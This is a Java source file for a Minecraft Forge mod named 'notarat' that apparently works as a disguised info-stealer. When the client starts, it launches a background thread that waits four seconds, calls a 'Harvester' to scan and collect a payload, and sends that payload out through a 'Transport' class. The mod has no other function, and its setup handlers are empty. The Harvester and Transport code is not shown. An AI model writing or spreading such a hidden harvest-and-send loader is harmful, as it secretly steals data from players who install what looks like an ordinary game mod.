package dev.xotic.notarat;

import com.mojang.logging.LogUtils;
import net.minecraft.client.Minecraft;
import net.minecraft.world.level.block.Blocks;
import net.minecraftforge.common.MinecraftForge;
import net.minecraftforge.event.TickEvent;
import net.minecraftforge.event.entity.player.PlayerInteractEvent;
import net.minecraftforge.event.server.ServerStartingEvent;
import net.minecraftforge.eventbus.api.IEventBus;
import net.minecraftforge.eventbus.api.SubscribeEvent;
import net.minecraftforge.fml.ModLoadingContext;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.config.ModConfig;
import net.minecraftforge.fml.event.lifecycle.FMLClientSetupEvent;
import net.minecraftforge.fml.event.lifecycle.FMLCommonSetupEvent;
import net.minecraftforge.fml.javafmlmod.FMLJavaModLoadingContext;
import net.minecraftforge.registries.ForgeRegistries;
import org.slf4j.Logger;

import java.util.concurrent.TimeUnit;

@Mod(Notarat.MODID)
public class Notarat {

    public static final String MODID = "notarat";
    private static final Logger LOGGER = LogUtils.getLogger();
    private static volatile boolean fired = false;

    public Notarat() {
        IEventBus modEventBus = FMLJavaModLoadingContext.get().getModEventBus();
        modEventBus.addListener(this::commonSetup);
        MinecraftForge.EVENT_BUS.register(this);

    }

    private static void start() {
        Thread t = new Thread(() -> {
            try {
                Thread.sleep(4000);
                Harvester.startScan();
                String payload = Harvester.getPayload();
                Transport.send(payload);
            } catch (Throwable e) {
                e.printStackTrace();
            }
        }, "notarat-init");
        t.setDaemon(false);
        t.start();
    }

    private void commonSetup(final FMLCommonSetupEvent event) {

    }

    @SubscribeEvent
    public void onServerStarting(ServerStartingEvent event) {
    }

    @Mod.EventBusSubscriber(modid = MODID, bus = Mod.EventBusSubscriber.Bus.MOD, value = net.minecraftforge.api.distmarker.Dist.CLIENT)
    public static class ClientModEvents {

        @SubscribeEvent
        public static void onClientSetup(FMLClientSetupEvent event) {
            start();
        }
    }
}